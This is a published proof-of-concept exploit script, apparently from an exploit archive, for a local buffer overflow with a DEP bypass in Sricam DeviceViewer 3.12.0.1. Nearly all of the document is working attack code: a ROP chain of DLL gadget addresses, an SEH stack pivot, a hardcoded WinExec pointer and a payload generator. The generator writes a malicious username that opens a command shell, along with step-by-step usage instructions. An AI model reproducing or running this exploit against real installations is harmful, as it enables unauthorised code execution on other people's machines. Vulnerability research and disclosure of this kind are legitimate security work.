# Exploit Title: Sricam DeviceViewer 3.12.0.1 - 'add user' Local Buffer Overflow (DEP Bypass)
# Date: 08/10/2019
# Exploit Author: d3adc0de
# Vendor Homepage: http://www.sricam.com/
# Software Link: http://download.sricam.com/Manual/DeviceViewer.exe
# Version: v3.12.0.1
# Exploit type: Local
# Tested on: Windows 7 SP1

# Steps to reproduce:
#   1. Get the WinExec address from arwin.exe kernel32.dll WinExec
#   2. Change the related address in the PoC
#   3. Generate the payload using the PoC
#   4. Log in the Sricam DeviceViewer application
#   5. Go to System Configuration -> User Management
#   6. Put the content of the generated file in User Info -> Username  
#   7. Click on Add
#   8. A command shell will appear

#!/usr/bin/python

from struct import pack, unpack

def create_rop_chain():

    rops = [
    
    0x6a1142aa,  # XOR EDX,EDX # RETN
    
    0x6a569810,  # POP EDX # RETN [avcodec-54.dll] 
    0x6ae9c126,  # &Writable location [avutil-50.dll] 
    
    0x6a5dac8a,  # POP EAX # RETN
    0xff9b929d,  # NEG "cmd\0"

    0x6a2420e8,  # NEG EAX # RETN [avcodec-54.dll]
    
    0x6994766b,  # PUSH EAX # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,3C # POP EBX # POP ESI # POP EDI # POP EBP # RETN [avformat-54.dll]
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
        
    0x6a18e062,  # ADD ESP, 10 # RETN ---> ESI
    0x6a2420ea,  # ROP NOP            ---> EDI     
        
    0x6a45e446,  # XCHG EAX,EDX # RETN  [avcodec-54.dll] 
    0x6a29d716,  # XCHG EAX,ECX # RETN  [avcodec-54.dll] 
    
    ##  ECX = ascii "cmd\0"
    
    0x6a569810,  # POP EDX # RETN [avcodec-54.dll] 
    0x6a36264a,  # CALL EBX
   
    ## EDX = CALL EBX
   
    0x6a5dac8a,  # POP EAX # RETN
    0x76e33231,  # ptr to WinExec() [kernel32.dll]  
    #### Unfortunately, this has to be hardcoded as no reliable pointer is available into the aplication  
    
    0x6a150411,  # XCHG EAX,EBX # RETN [avcodec-54.dll]
    
    ## EBX = &WinExec
    
    0x6a5dac8a,  # POP EAX # RETN
    0xffffffff,  # -0x00000001-> ebx
    0x6a2420e8,  # NEG EAX # RETN [avcodec-54.dll]
    
    ## EAX = 1
        
    0x6a5eb992,  # PUSHAD # RETN [avcodec-54.dll]
    0x6a2420ea,  # ROP NOP    
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    0x6a2420ea,  # ROP NOP
    ]
    return ''.join(pack('<I', _) for _ in rops)


def nops(length):
    return "\x90" * length

rop_chain = create_rop_chain()
maxlen = 5000

# Stack pivoting address
# 0x6a443e58 : {pivot 2252 / 0x8cc} :  # ADD ESP,8BC # POP EBX # POP ESI # POP EDI # POP EBP # RETN [avcodec-54.dll]
seh = pack("<I", 0x6a443e58)

# Don't care nseh
nseh = nops(4)

payload = nops(8) + rop_chain + nops(360 - len(rop_chain) - 8) + nops(20) + nseh + seh + nops(300)
sec = maxlen - len(payload)
payload += nops(sec) # More junk to reach 5000

print("Exploit Length: " + str(len(payload)))

try:
    fname = "exprop.txt"
    exploit = open(fname,"w")
    print("Sricam DeviceViewer 3.12.0.1 Local Buffer Overflow Exploit")
    print("Author: d3adc0de\n")
    print("[*] Creating evil username")
    exploit.write(payload)
    exploit.close()
    print("[+] Username file created\n")
    print("[i] Now go to 'User Management' and try to add a user with user=<filecontent>")
    print("[+] A command shell will open")
except:
    print("[!] Error creating the file")
            